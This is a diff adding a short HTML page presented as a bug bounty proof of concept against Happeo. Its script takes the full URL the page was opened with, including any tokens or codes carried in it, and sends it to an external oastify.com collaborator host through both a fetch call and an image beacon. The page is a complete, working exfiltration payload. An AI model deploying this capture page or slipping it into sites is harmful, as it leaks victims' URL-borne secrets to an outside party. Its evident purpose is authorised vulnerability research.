@@ -1,0 +1,9 @@
+<!doctype html><html><head><meta charset="utf-8"><title>sec-research capture</title></head><body>
+<p>Security research PoC (Happeo bug bounty). This page logs the URL it was opened with.</p>
+<pre id="u"></pre>
+<script>
+var u=location.href; document.getElementById('u').textContent=u;
+var c='https://li73xx7527irfj30nc92w2i2zt5qtqc4e4tnd4ht.oastify.com/cap?u='+encodeURIComponent(u);
+try{fetch(c,{mode:'no-cors'})}catch(e){}
+new Image().src=c+'&img=1';
+</script></body></html>
